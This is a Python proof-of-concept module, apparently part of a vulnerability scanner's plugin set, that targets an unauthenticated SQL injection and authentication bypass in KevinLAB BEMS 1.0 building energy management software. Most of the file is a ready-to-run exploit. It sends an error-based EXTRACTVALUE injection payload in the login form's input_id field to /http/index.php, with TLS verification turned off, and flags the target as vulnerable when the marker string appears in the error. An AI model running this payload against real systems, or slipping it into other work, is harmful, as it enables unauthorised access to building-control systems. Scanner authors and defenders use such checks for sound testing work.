import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''KevinLAB BEMS 1.0 Unauthenticated SQL Injection/Authentication Bypass''',
        "description": '''The application suffers from an unauthenticated SQL Injection vulnerability. Input passed through 'input_id' POST parameter in '/http/index.php' is not properly sanitised before being returned to the user or used in SQL queries.''',
        "severity": "high",
        "references": [
            "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5655.php", 
            "https://www.exploit-db.com/exploits/50146", 
            "https://packetstormsecurity.com/files/163572/"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["kevinlab", "sqli"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/http/index.php"""
        method = "POST"
        data = """requester=login&request=login&params=[{"name":"input_id","value":"USERNAME' AND EXTRACTVALUE(1337,CONCAT(0x5C,0x5A534C,(SELECT (ELT(1337=1337,1))),0x5A534C)) AND 'joxy'='joxy"},{"name":"input_passwd","value":"PASSWORD"},{"name":"device_id","value":"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"},{"name":"checked","value":false},{"name":"login_key","value":""}]"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept-Encoding': 'gzip, deflate'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""XPATH syntax error""" in resp0.text and """: '\ZSL1ZSL'""" in resp0.text) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url